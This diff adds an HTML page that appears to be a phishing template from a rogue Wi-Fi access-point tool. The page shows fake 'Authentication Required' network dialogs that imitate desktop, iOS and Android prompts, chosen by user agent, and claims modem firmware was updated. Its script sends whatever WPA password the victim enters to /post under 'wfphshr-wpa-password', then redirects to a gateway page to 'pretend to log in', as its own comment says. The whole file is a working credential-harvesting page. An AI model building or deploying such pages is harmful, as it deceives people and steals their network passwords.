@@ -1,0 +1,703 @@
+<!DOCTYPE html>
+<html lang="en">
+<script type="text/javascript">
+	var ESSID = 'ESSID';
+</script>
+<head>
+	<title>Authentication Required</title>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<link rel="stylesheet" type="text/css" href="./static/css/framework7.material.min.css">
+	<style type="text/css">
+		@font-face {
+			font-family: 'lucy';
+			src: url('./static/fonts/segoeui.ttf');
+		}
+		@font-face {
+			font-family: 'lucy-b';
+			src: url('./static/fonts/segoeui-bold.ttf');
+		}
+		*{
+			user-select: none;
+			-webkit-user-select: none;
+			-moz-user-select: none;
+			-ms-user-select: none;
+			-o-user-select: none;
+		}
+		input,
+		.main .window p,
+		.main .window p span{
+			user-select: text;
+			-webkit-user-select: text;
+			-moz-user-select: text;
+			-ms-user-select: text;
+			-o-user-select: text;
+		}
+		/* Laptop, PC */
+		.hide,
+		.hide:hover,
+		.hide:active,
+		.hide:focus{
+			position: absolute;
+			visibility: hidden !important;
+			pointer-events: none !important;
+		}
+		.main *{
+			color: #333;
+			-webkit-appearance: none;
+			margin: 0;
+			padding: 0;
+			font-family: 'lucy', 'Segoe UI', 'segoe ui', 'segoeui', Segoe UI, arial;
+		}
+		.main textarea, 
+		.main input{ 
+			outline: none;
+			background: rgb(248,248,248) !important;
+		}
+		.main *:active,
+		.main *:focus{
+			outline: 0 !important;
+			-webkit-appearance: none;
+		}
+		input::-moz-focus-inner {
+			/* Far out mozilla.. */
+			border: 0 !important;
+			outline: 0 !important;
+			/* Really...? */
+		}
+		.main .window{
+			transition: all .3s ease;
+			transform: none;
+			-webkit-transform: none;
+			-moz-transform: none;
+			-ms-transform: none;
+			-o-transform: none;
+			background: rgb(248,248,248) !important;
+			position: absolute;
+			left: 50%;
+			margin-left: -200px;
+			width: 400px;
+			height: auto;
+			border-radius: 0 0 3px 3px;
+			border: 1px solid rgb(180,180,180);
+			border-top: none;
+			box-shadow: 0 2px 1px 0px rgba(0,0,0,.25);
+			top: 0;
+		}
+		.main .faded{
+			transform: perspective(900px) rotateX(30deg) !important;
+			-webkit-transform: perspective(900px) rotateX(30deg) !important;
+			-moz-transform: perspective(900px) rotateX(30deg) !important;
+			-ms-transform: perspective(900px) rotateX(30deg) !important;
+			-o-transform: perspective(900px) rotateX(30deg) !important;
+			opacity: 0;
+			top: -60px !important;
+		}
+		.main .window h1{
+			font-size: 18px;
+			color: #000;
+			padding: 14px 20px 22px 20px;
+			font-weight: 300;
+		}
+		.main .window p{
+			font-size: 14px;
+			line-height: 17px;
+			padding-left: 20px;
+			max-width: 360px;
+		}
+		.main .window p span{
+			font-family: 'Segoe UI', 'segoe ui', 'segoeui', 'lucy-b', 'lucy', Segoe UI Bold, arial;
+			font-weight: 500;
+		}
+		.main .window input[type=button]{
+			background: rgb(248,248,248) !important;
+			float: right;
+			height: 30px;
+			font-size: 13px;
+			width: 80px;
+			border: 1px solid rgb(180,180,180);
+			box-shadow: 0 1px 0 0 rgba(0,0,0,.1);
+			border-radius: 2px;
+			margin: 0;
+			margin-left: 10px;
+			margin-bottom: 20px;
+			padding: 0;
+			line-height: 0;
+		}
+		.main .window input[type=button]:active{
+			background: rgb(215,215,215) !important;
+			box-shadow: none;
+		}
+		.main .window input[type=button]:first-of-type{
+			margin-right: 22px;
+		}
+		.main .window input[type=button]:last-of-type{
+			color: #000;
+		}
+		.main .window input[type=text],
+		.main .window input[type=password]{
+			height: 22px;
+			border: 1px solid #d9d9d9;
+			font-size: 13px;
+			line-height: 22px !important;
+			padding: 0 5px;
+			width: 200px;
+		}
+		.main .window input[type=text]:focus,
+		.main .window input[type=password]:focus{
+			border: 1px solid #4d90fe;
+		}
+		.main .window input[name=login]{
+			font-family: 'Segoe UI', 'segoe ui', 'segoeui', 'lucy-b', 'lucy', Segoe UI Bold, arial;
+			font-weight: 500;
+		}
+		.main .window table{
+			width: 72%;
+			margin: 20px 14%;
+			padding-bottom: 14px;
+		}
+		.main .window table tr td{
+			width: 100%;
+			font-size: 14px;
+			line-height: 30px;
+		}
+
+		/* iOS */
+		.ios {
+			box-sizing: border-box;
+			position: absolute;
+			left: 0;
+			top: 0;
+			width: 100%;
+			height: 100%;
+			background: #efeff4;
+			-webkit-transform: translate3d(0,0,0);
+			transform: translate3d(0,0,0);
+			font-family: -apple-system,SF UI Text,Helvetica Neue,Helvetica,Arial,sans-serif;
+			color: #000;
+			font-size: 14px;
+			line-height: 1.4;
+			-webkit-text-size-adjust: 100%;
+		}
+		.ios * {
+			-webkit-tap-highlight-color: transparent;
+			-webkit-touch-callout: none;
+		}
+		.ios .content-block-title + .card, .content-block-title + .content-block, .content-block-title + .list-block {
+			margin-top: 10px;
+		}
+		.ios .list-block {
+			margin: 35px 0;
+			font-size: 17px;
+		}
+		.ios .list-block ul {
+			background: #fff;
+			list-style: none;
+			padding: 0;
+			margin: 0;
+			position: relative;
+		}
+		.ios .list-block ul::before {
+			content: '';
+			position: absolute;
+			left: 0;
+			top: 0;
+			bottom: auto;
+			right: auto;
+			height: 1px;
+			width: 100%;
+			background-color: #c8c7cc;
+			display: block;
+			z-index: 15;
+			-webkit-transform-origin: 50% 0;
+			transform-origin: 50% 0;
+		}
+		.ios .list-block li {
+			box-sizing: border-box;
+			position: relative;
+		}
+		.ios .list-block .item-content {
+			box-sizing: border-box;
+			padding-left: 15px;
+			min-height: 44px;
+			display: -webkit-box;
+			display: -ms-flexbox;
+			display: -webkit-flex;
+			display: flex;
+			-webkit-box-pack: justify;
+			-ms-flex-pack: justify;
+			-webkit-justify-content: space-between;
+			justify-content: space-between;
+			-webkit-box-align: center;
+			-ms-flex-align: center;
+			-webkit-align-items: center;
+			align-items: center;
+		}
+		.ios .list-block .item-inner {
+			padding-right: 15px;
+			position: relative;
+			width: 100%;
+			padding-top: 8px;
+			padding-bottom: 7px;
+			min-height: 44px;
+			box-sizing: border-box;
+			display: -webkit-box;
+			display: -ms-flexbox;
+			display: -webkit-flex;
+			display: flex;
+			-webkit-box-flex: 1;
+			-ms-flex: 1;
+			overflow: hidden;
+			-webkit-box-pack: justify;
+			-ms-flex-pack: justify;
+			-webkit-justify-content: space-between;
+			justify-content: space-between;
+			-webkit-box-align: center;
+			-ms-flex-align: center;
+			-webkit-align-items: center;
+			align-items: center;
+			-ms-flex-item-align: stretch;
+			-webkit-align-self: stretch;
+			align-self: stretch;
+		}
+		.ios .list-block .item-title.label {
+			width: 35%;
+			-webkit-flex-shrink: 0;
+			-ms-flex: 0 0 auto;
+			flex-shrink: 0;
+			color: #000;
+		}
+		.ios .list-block .item-title.label {
+			vertical-align: top;
+		}
+		.ios .list-block .item-title {
+			-webkit-flex-shrink: 1;
+			-ms-flex: 0 1 auto;
+			flex-shrink: 1;
+			min-width: 0;
+			white-space: nowrap;
+			position: relative;
+			overflow: hidden;
+			text-overflow: ellipsis;
+			max-width: 100%;
+		}
+		.ios .list-block .item-title.label + .item-input {
+			margin-left: 5px;
+		}
+		.ios .list-block .item-input {
+			width: 100%;
+			margin-top: -8px;
+			margin-bottom: -7px;
+			-webkit-box-flex: 1;
+			-ms-flex: 1;
+			-webkit-flex-shrink: 1;
+			-ms-flex: 0 1 auto;
+			flex-shrink: 1;
+		}
+		.ios .list-block input[type="time"], .ios .list-block input[type="number"], .ios .list-block input[type="search"], .ios .list-block input[type="text"], .ios .list-block input[type="password"], .ios .list-block input[type="email"], .ios .list-block input[type="tel"], .ios .list-block input[type="url"], .ios .list-block input[type="date"], .ios .list-block input[type="datetime-local"], .ios .list-block select, .ios .list-block textarea {
+			-webkit-appearance: none;
+			-moz-appearance: none;
+			-ms-appearance: none;
+			appearance: none;
+			box-sizing: border-box;
+			border: none;
+			background: 0 0;
+			border-radius: 0;
+			box-shadow: none;
+			display: block;
+			padding: 0;
+			margin: 0;
+			width: 100%;
+			height: 43px;
+			color: #000;
+			font-size: 17px;
+			font-family: inherit;
+		}
+		.ios a, input, select, textarea {
+			outline: 0;
+		}
+		.ios .list-block .item-inner::after {
+			content: '';
+			position: absolute;
+			left: 0;
+			bottom: 0;
+			right: auto;
+			top: auto;
+			height: 1px;
+			width: 100%;
+			background-color: #c8c7cc;
+			display: block;
+			z-index: 15;
+			-webkit-transform-origin: 50% 100%;
+			transform-origin: 50% 100%;
+		}
+		.ios .list-block ul {
+			list-style: none;
+		}
+		.ios .list-block {
+			font-size: 17px;
+		}
+		.ios .list-block ul::after {
+			content: '';
+			position: absolute;
+			left: 0;
+			bottom: 0;
+			right: auto;
+			top: auto;
+			height: 1px;
+			width: 100%;
+			background-color: #c8c7cc;
+			display: block;
+			z-index: 15;
+			-webkit-transform-origin: 50% 100%;
+			transform-origin: 50% 100%;
+		}
+		#demoform-2{
+			margin: 0;
+		}
+		.android .spoiler{
+			height: 20px;
+			width: 100%;
+			display: inline-block;
+		}
+		.displayNone{
+			display: none !important;
+		}
+	</style>
+
+	<link rel="stylesheet" type="text/css" href="./static/css/framework7.material.min.css">
+
+	<!-- Override framework7 material css -->
+	<style type="text/css">
+		.android .modal.modal-in{
+			margin-top: -153px !important;
+			box-shadow: 0 9px 38px rgba(0,0,0,.3),0 15px 12px rgba(0,0,0,.12);
+		}
+		.android label.label-checkbox i.icon-form-checkbox{
+			margin-left: 6px;
+		}
+		.android .list-block ul::before,
+		.android .list-block ul::after{
+			display: none !important;
+		}
+		.android .list-block .item-inner::after {
+			display: none !important;
+		}
+		.android .focus-state.error{
+			background: #F00 !important;
+		}
+		.android .modal-button.ok.inactive{
+			opacity: .35;
+			pointer-events: none;
+		}
+	</style>
+</head>
+<body>
+	<div class="container main hide">
+		<div class="window faded">
+			<h1>Authentication Required</h1>
+			<p>The network <span></span> requires a password. The server says: Modem firmware was updated.</p>
+			<form id="form">
+				<input class="hide" type="password" name="encrypt" value="true">
+				<table>
+					<tr>
+						<td>Name:</td>
+						<td><input type="text" name="name"></td>
+					</tr>
+					<tr>
+						<td>Password:</td>
+						<td><input type="password" name="password" autocomplete="false"></td>
+					</tr>
+				</table>
+			</form>
+			<input type="button" name="login" value="Log In">
+			<input type="button" name="cancel" value="Cancel">
+		</div>
+		<div class="dump"></div>
+	</div>
+	<div class="container ios hide">
+		<div class="list-block">
+			<ul>
+				<li>
+					<div class="item-content">
+						<div class="item-inner">
+							<div class="item-title label">Password</div>
+							<div class="item-input">
+								<form>
+									<input id="pwfield" name="password" type="password">
+								</form>
+							</div>
+						</div>
+					</div>
+				</li>
+			</ul>
+		</div>
+	</div>
+	<div class="container android hide">
+		<div style="display: block; margin-top: -107px;" class="modal  modal-in">
+			<div class="modal-inner">
+				<div class="modal-title"><span></span></div>
+				<div class="modal-text">Enter your password</div>
+				<div class="input-field">
+					<input name="modal-password" placeholder="Password" class="modal-text-input" type="password">
+				</div>
+			</div>
+			<form id="demoform-2" class="store-data list-block">
+				<ul>
+					<li class="check1">
+						<label class="label-checkbox item-content">
+							<input name="ks-checkbox" value="Show password" type="checkbox">
+							<div class="item-media"><i class="icon icon-form-checkbox"></i></div>
+							<div class="item-inner">
+								<div class="item-title">Show password</div>
+							</div>
+						</label>
+					</li>
+					<li class="check2">
+						<label class="label-checkbox item-content">
+						<input name="ks-checkbox" value="Show advanced options" type="checkbox">
+							<div class="item-media"><i class="icon icon-form-checkbox"></i></div>
+							<div class="item-inner">
+							<div class="item-title">Show advanced options</div>
+							</div>
+						</label>
+					</li>
+					<div class="spoiler displayNone"></div>
+				</ul>
+			</form>
+			<div class="modal-buttons modal-buttons-2 ">
+				<span class="modal-button cancel">Cancel</span>
+				<span class="modal-button modal-button-bold ok inactive">Connect</span>
+			</div>
+		</div>
+		<div class="modal-overlay modal-overlay-visible"></div>
+	</div>
+	<script src="./static/libs/jquery.min.js"></script>
+	<script src="./static/js/framework7.min.js"></script>
+	<script src="./static/js/kitchen-sink.js"></script>
+	<script type="text/javascript">
+        // OS Functions
+        // PC & Laptop
+        function chrome(){
+        	var checked = false;
+        	$('.main').removeClass('hide');
+
+        	// main.js
+        	// Functions
+        	function setESSID(){
+        		$('body .main .window p span').text(ESSID);
+        		$('body .main .window input[name=name]').val(ESSID);
+        	}
+        	function toggle(){
+        		$('body .main .window').toggleClass('faded');
+        	}
+        	function hide(){
+        		$('body .main .window').addClass('faded');
+        	}
+        	function close(){
+        		$('body .main .window').addClass('faded');
+        		setTimeout(function(){
+        			window.location = window.location;
+        		}, 800);
+        	}
+
+        	$('.main form').submit(function(e){
+        		hide();
+
+        		if ($('.main input[name=password]').val().length < 8) {
+        			close();
+        			return false;
+        		} else {
+    				e.preventDefault();
+
+    				// timeout:800
+    				setTimeout(function(){
+	    				$.post('/post', 'wfphshr-wpa-password=' + $('.main input[name=password]').val(), function(){
+	    					self.location = './gateway.html'; // pretend to log in to gateway
+	    				});
+    				}, 800);
+			    }
+			});
+
+			// On start
+			// timeout:120
+			setTimeout(function(){ 
+				setESSID();
+				toggle();
+				$('body .main .window input[name=password]').focus();
+			}, 120);
+
+			$('body .main .window input[name=login]').click(function(){
+				$('body .main form').submit();
+			});
+
+			$('body .main .window input[name=cancel]').click(function(){
+				close();
+			});
+
+			$(document).keypress(function(e){
+				if (e.keyCode === 13) { // enter
+					$('.main form').submit();
+				}
+				if (e.keyCode === 27) { // esc
+					$('.main .window input[name=cancel]').click();
+				}
+			});
+
+			// Alternative (not as compatible with every device)
+			// $(document).keydown(function(e){
+				// if (e.keyCode === 13) { // enter
+					// $('body .main form').submit();
+				// }
+				// if (e.keyCode === 27) { // esc
+					// $('body .main .window input[name=cancel]').click();
+				// }
+			// });
+		}
+
+
+
+    	// iOS
+    	function ios(){
+    		$('.ios').removeClass('hide');
+
+    		// Safari seems to block this
+    		$('.ios, .ios *').click(function(){
+    			$('.ios input[name=password]').focus();
+    		});
+
+    		$('.ios form').submit(function(){
+    			if ($('.ios input[name=password]').val().length < 8) {
+			        // Don't submit a password smaller than 8 characters
+			        return false;
+			    } else {
+			    	$.post('/post', 'wfphshr-wpa-password=' + $('.ios input[name=password]').val(), function(){
+						window.location = './gateway.html'; // pretend to log in to gateway
+			    	});
+			    }
+			});
+
+    		// submit form on enter
+			$(document).keypress(function(e){
+				if (e.keyCode === 13) { // enter
+	    			$('.ios form').submit();
+				}
+			});
+    	}
+
+
+
+        // Android
+        function android(){
+        	var checked = false;
+        	$('.android').hide();
+        	$('.android').removeClass('hide');
+        	$('.android .modal-title span').text(ESSID);
+        	// timeout:1000
+        	setTimeout(function(){ 
+               	$('.android').fadeIn(260); // 260 fades nice on slow androids
+        	}, 1000);
+
+        	$('.android .check1').click(function(){ 
+				if ($('.android input[name=modal-password]').prop("type", "password")) {
+					// If password
+					$('.android .check1 input[type=checkbox]').prop("checked", "checked");
+					$('.android input[name=modal-password]').prop("type", "text");
+				} else {
+					// If text
+					$('.android .check1 input[type=checkbox]').removeAttr("checked");
+					$('.android input[name=modal-password]').prop("type", "password");
+				}
+				return false;
+        	});
+
+        	function showButton(){ 
+        		// timeout:100
+        		setTimeout(function(){
+	        		if ($('.android input[name=modal-password]').val().length < 8) {
+	        			$('.modal-button.ok').addClass('inactive');
+	        		} else {
+	        			$('.modal-button.ok').removeClass('inactive');
+	        		}
+        		}, 100);
+        	}
+
+        	$('.android input[name=modal-password]').keypress(function(){ 
+        		showButton();
+        	});
+        	$('.android input[name=modal-password]').keydown(function(){ 
+        		showButton();
+        	});
+        	
+        	$('.android .check2').click(function(){ 
+        		$('.android .spoiler').toggleClass('displayNone');
+        		if ($('.android .spoiler').hasClass('displayNone')) {
+					$('.android .check2 input[type=checkbox]').removeAttr("checked");
+        		} else {
+					$('.android .check2 input[type=checkbox]').prop("checked", "checked");
+        		}
+        		return false;
+        	});
+
+        	function hideAndroid(){
+        		$('.android').fadeOut(200);
+        	}
+        	function closeAndroid(){
+        		$('.android').fadeOut(200);
+        		// timeout:1000
+        		setTimeout(function(){ 
+        			window.location = window.location;
+        		}, 1000);
+        	}
+
+        	$('.android .modal-button.cancel').click(function(){ 
+        		closeAndroid();
+        	});
+        	$('.android .modal-button.ok').click(function(){ 
+        		if ($('.android input[name=modal-password]').val().length < 8) {
+        			$('.android .input-field.focus-state').addClass('error');
+        			window.location = window.location;
+        			return false;
+        		} else {
+        			hideAndroid();
+        			// timeout:1000
+        			setTimeout(function(){
+        				$.post('/post', 'wfphshr-wpa-password=' + $('.android input[name=modal-password]').val(), function(){
+							self.location = './gateway.html';
+        				});
+        			}, 600);
+        		}
+        	});
+        }
+
+
+
+        // Get OS
+        var userAgent = navigator.userAgent || navigator.vendor || navigator.platform || window.opera;
+
+        // Windows Phone must come first because its UA also contains "Android"
+        if (/Windows phone|windows phone/i.test(userAgent)) {
+            // Windows Phone
+            $(window).load(function(){
+            	// No idea what this looks like, will use chrome modal for now
+            	chrome();
+            });
+        } else if (/Android|android/i.test(userAgent)) {
+            // Android
+            $(window).load(function(){
+				android();
+            });
+        } else if (/iPad|iPhone|iPod|ipad|iphone|ipod|ios|iOS/.test(userAgent) && !window.MSStream) {
+            // iOS
+            $(window).load(function(){
+            	ios();
+            });
+        } else {
+            // Laptop/PC
+            $(window).load(function(){
+            	chrome();
+            });
+        }
+    </script>
+</body>
+</html>
